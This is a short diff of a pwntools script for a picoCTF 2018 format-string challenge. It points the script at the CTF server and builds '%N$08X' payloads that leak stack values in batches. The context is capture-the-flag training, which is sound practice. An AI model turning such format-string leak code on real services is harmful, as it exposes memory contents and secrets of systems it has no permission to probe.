@@ -9,8 +9,8 @@ def batch(it, siz):
 
 
 fmt = ".%{0}$08X"
-# p = pwn.tubes.remote.remote("2018shell.picoctf.com", 23397)
-p = pwn.tubes.process.process(["./echo"], shell=True)
+p = pwn.tubes.remote.remote("2018shell.picoctf.com", 23397)
+#p = pwn.tubes.process.process(["./echo"], shell=True)
 prompt = p.read()
 octet_fmt_strings = [fmt.format(i).encode() for i in range(26, 45)]
 for format_string_list in batch(octet_fmt_strings, 5):
